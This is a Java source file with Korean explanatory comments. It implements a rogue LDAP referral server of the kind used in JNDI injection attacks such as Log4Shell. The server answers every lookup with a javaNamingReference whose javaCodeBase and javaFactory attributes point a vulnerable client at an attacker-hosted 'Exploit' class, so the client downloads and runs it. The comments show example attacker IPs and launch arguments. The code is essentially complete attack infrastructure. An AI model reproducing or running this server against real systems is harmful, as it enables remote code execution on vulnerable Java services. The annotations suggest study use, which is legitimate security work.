//LDAP 서버를 구성하는 JAVA 코드
public class LDAPRefServer {
    //DN : dc=example.com
    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void main ( String[] args ) {
        int port = 1389;  //리스닝 포트
        if ( args.length < 1 || args[ 0 ].indexOf('#') < 0 ) {
            System.err.println(LDAPRefServer.class.getSimpleName() + " <codebase_url#classname> [<port>]"); //$NON-NLS-1$
            System.exit(-1);
        } //해당 자바파일을 실행할때, [192.168.128.150#Exploit.class 8080] 이렇게 주면 해당 LDAP응답을 해당 클래스를 가리키도록 함 
        else if ( args.length > 1 ) {
            port = Integer.parseInt(args[ 1 ]);
        }
//
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                "listen", //$NON-NLS-1$
                InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                port,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
            ds.startListening();

        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;
        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }


        /**
         * {@inheritDoc}
         *
         * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
         */
        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }

        }

        //Entry e에 들어가는 Attribute들이 LDAP서버의 응답값들.
        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "foo");   //1. JavaClassName : foo
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }
            e.addAttribute("javaCodeBase", cbstring);  //2. javaCodeBase : http://192.168.128.139:8000
            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$ //3. objectClass : javaNamingReference
            e.addAttribute("javaFactory", this.codebase.getRef());  //4. javaFactory : Exploit
            result.sendSearchEntry(e);  // Entry를 전송한다.
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

    }
}